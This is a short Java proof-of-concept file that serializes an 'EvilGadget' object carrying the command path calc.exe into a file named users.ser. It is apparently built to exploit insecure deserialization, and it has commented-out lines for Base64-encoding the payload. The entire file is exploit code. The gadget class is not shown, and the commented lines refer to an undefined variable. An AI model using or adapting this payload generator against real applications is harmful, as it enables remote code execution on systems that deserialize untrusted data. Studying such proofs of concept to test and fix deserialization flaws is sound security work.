import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class PoC {
    public static void main(String[] args) throws IOException {
        EvilGadget gadget = new EvilGadget("C:\\Windows\\System32\\calc.exe");
        try {
            FileOutputStream fos = new FileOutputStream("users.ser");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(gadget);
            oos.close();
            fos.close();
        }
        catch (IOException ioe)
        {
            ioe.printStackTrace();
        }

        //String base64Encoded = Base64.getEncoder().encodeToString(baos.toByteArray());
        //System.out.println(base64Encoded);
    }
}
